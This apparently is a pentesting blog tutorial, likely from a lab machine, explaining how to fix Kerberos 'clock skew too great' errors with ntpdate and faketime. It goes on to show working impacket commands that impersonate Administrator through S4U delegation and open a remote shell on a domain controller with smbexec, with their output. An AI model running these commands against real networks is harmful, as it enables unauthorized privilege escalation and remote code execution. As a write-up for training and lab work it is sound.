<div class="banner">
    <div class="ads">
        <span></span>
        Get Free - Docs template
    </div>
    <h1>
        <span>¿By Vishok - Hacking Pentesting?</span>
        Clock Skew Too Great
    </h1>
</div>

####
####
## Bypassing Kerberos Time Verification
### Clock skew too great:
**Kerberos** is a network authentication protocol that uses encrypted tickets to verify identities in distributed systems. One of its fundamental security measures is **strict time synchronization** between clients and servers.
####
<div class="tip">

> Is time to perfom a deep analysis to fixed this error. 
</div>

####
```ruby
Kerberos(Clock Skew Too Great)
```
####
Occurs when there's a time difference greater than **5 minutes** (by default) between the local clock and the DC[*Domain Controller*]. This protection prevents replay attacks where an attacker might attempt to reuse old tickets. In compromised environments or during penetration testing, this mechanism can block valid TGT [*Ticket Granting Ticket*] acquisition, preventing access to resources.
####
####
####
## Solution using ntpdate
### Ntpdate:
The **ntpdate** command is a utility for setting and synchronizing the date and time of a computer system to match that of a reliable NTP [*Network Time Protocol*] server. By ensuring the system clock is accurate, ntpdate helps maintain system logs, schedule tasks, and ensure time-sensitive operations run effectively. But this protocol or service can not work, installed or available to distribution that you are using.
####
```ruby
sudo systemctl status systemd-timesyncd          
    Result ->
        Unit systemd-timesyncd.service could not be found.
```
####
Synchronizing a computer internal clock is crucial in maintaining synchronization across clusters databases, and logging services. When systems operate on different times, anomalies may occu  to data corruption or erroneous log entries. Using sudo ntpdate host, an administrator can  computer clock adheres to a globally accepted time standard provided by a specific host stron or NTP server.
####
```ruby
ntpdate coloso.local
    Result ->
        2025-05-06 15:12:02.237340 (-0700) +3181.036456 +/- 0.059572 coloso.local 10.10.11.51 s1 no-leap
        CLOCK: step_systime: Operation not permitted
```
####
Under certain conditions, it might be necessary to enforce an instantaneous time adjustment rather than gradual
syncing, for example avoiding time make use **slewed**, **settimeofday**.
####
```ruby
ntpdate -b coloso.local
```
####
In many cases de the speed of the internet play a crucial role when you try to syncronize against a Domain Controller, in very useful to have so kwoledge in automation programing lenguajes.
####
<div class="tip">

> Is time to craft our custom script to send a **multiple** syncronizing attempt request.
</div>

####
```ruby
for x in $(seq 1 10); do sudo ntpdate coloso.local; done
```
####
####
####
## Solution using faketime
### Faketime:
The **faketime** tool intercepts system time-related calls, allowing applications to be *FOOLED* about the current time, we can use this to bypass the **Kerberos time verification** in **impacket** tools against a Windows System Operation that running over a Domain Controller.
####
First we obtain the exact time from the Domain Controller via SMB, since this protocol doesn't have the same time restrictions as Kerberos and then we use faketime with the obtained time to generate our TGT. This step generates a `.ccache` file with a valid Kerberos ticket, synchronized with the *DC* time.
####
| Get date commands | Description |
| ----- | ----- |
| date /t | Displays only the current date | 
| time /t | Displays only the current time |
| date | Displays and allows you to modify the date |
| Get-Date | Displays full date and time |
| Get-Date -Format "dd/MM/yyyy" | Custom output date | 
| Get-Date -Format "HH:mm:ss" | Hour in 24h format |
| (Get-Date).DayOfWeek | Day of the week |
####
Once we obtain the time of the DC or Windows, we must to pass that time to **faketime**:
####
```ruby
date
    Result -> 
        Tuesday, May 6, 2025 3:07:50 PM

faketime "2025-05-06 15:07:50"
```
####
That command is very important that was executed in the same line or in the same command when you try to connect or get A *TGT* ticket: `faketime - impacket-getST`.
####
<div class="warning">

> The **faketime** command must be added in the same line without use **pipes**, **xargs** etc.
</div>

####
So if we want to get a TGT, we must to execute the next command:
####
```ruby
faketime "2025-04-19 21:24:36" impacket-getST -spn 'cifs/coloso.local' -impersonate Administrator -dc-ip 10.10.11.174 'coloso/vishok$:vishok'
    Result ->
        [+] Getting TGT for user
        [+] Impersonating Administrator
        [+]     Requesting S4U2self
        [+]     Requesting S4U2proxy
        [+] Saving ticket in Administrator.ccache
```
####
The `faketime "2025-04-19 21:24:36" impacket-getST` is in the same line, both are different comands. Furthermore, the second command will haven't a highlight color, but this is normal, don't worry, the second command will be executed.
####
####
####
## Technical Deep Dive: faketime mechanics
### Deep Dive:
**Faketime** works by intercepting system calls related to time through *LD_PRELOAD*, a Linux mechanism that loads libraries before others. The *LD_PRELOAD* variable allows to paths to libraries which are to be loaded before any other libraries are loaded. What’s important, the  symbols e.g. functions contained in the preloaded libraries take precedence over the symbols from libraries loaded afterwards.
####
When applications like **impacket-getST** make system calls to check the current time like `time()`, `gettimeofday()`, or `clock_gettime()`, these calls are redirected to libfaketime instead of the standard C library.
####
<div class="img">
    <img src="/machines/public/clockskew/2.png" loading="lazy" decoding="async" />
</div>

####
####
####
## Final configuration
### KRB5CCNAME:
To use the generated ticket, we export it as an environment variable this tells Impacket tools where to find our Kerberos credentials. Finally we execute the target command with the spoofed time:
####
```ruby
date
Result -> 
        Tuesday, May 6, 2025 3:07:50 PM

KRB5CCNAME=Administrator.ccache faketime "2025-04-19 21:30:08" impacket-smbexec -dc-ip 10.10.11.174 -no-pass -k coloso/administrator@coloso.local
```
####
How you can see, in all moment is necessary use the **faketime**.